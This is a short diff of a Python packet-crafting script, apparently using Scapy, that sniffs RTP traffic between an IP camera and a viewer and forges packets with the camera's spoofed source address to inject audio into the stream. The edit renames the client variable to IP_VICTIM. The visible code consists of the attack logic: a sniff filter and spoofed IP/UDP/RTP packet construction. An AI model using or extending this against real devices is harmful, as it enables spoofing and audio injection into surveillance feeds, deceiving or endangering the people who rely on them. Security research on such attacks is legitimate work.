@@ -4,7 +4,7 @@ import struct
 
 IFACE = "en0"
 IP_CAMERA = "192.168.0.81"
-IP_CLIENT = "192.168.0.162"
+IP_VICTIM = "192.168.0.162"
 AUDIO_START_DELAY = 1         
 
 RTP_PORT_CAMERA = 0
@@ -31,7 +31,7 @@ def get_stream_params():
     max_attempts = 50
 
     while len(audio_packets) < 5 and attempts < max_attempts:
-        packets = sniff(count=1, filter=f"udp and src {IP_CAMERA} and dst {IP_CLIENT}", iface=IFACE, timeout=5)
+        packets = sniff(count=1, filter=f"udp and src {IP_CAMERA} and dst {IP_VICTIM}", iface=IFACE, timeout=5)
         attempts += 1
 
         if not packets:
@@ -105,7 +105,7 @@ def inject_audio(audio_file):
             if len(chunk) < SAMPLES_PER_PACKET:
                 chunk += b'\x00' * (SAMPLES_PER_PACKET - len(chunk))
 
-            packet = IP(src=IP_CAMERA, dst=IP_CLIENT) / \
+            packet = IP(src=IP_CAMERA, dst=IP_VICTIM) / \
                      UDP(sport=sport, dport=dport) / \
                      RTP(
                          version=2,
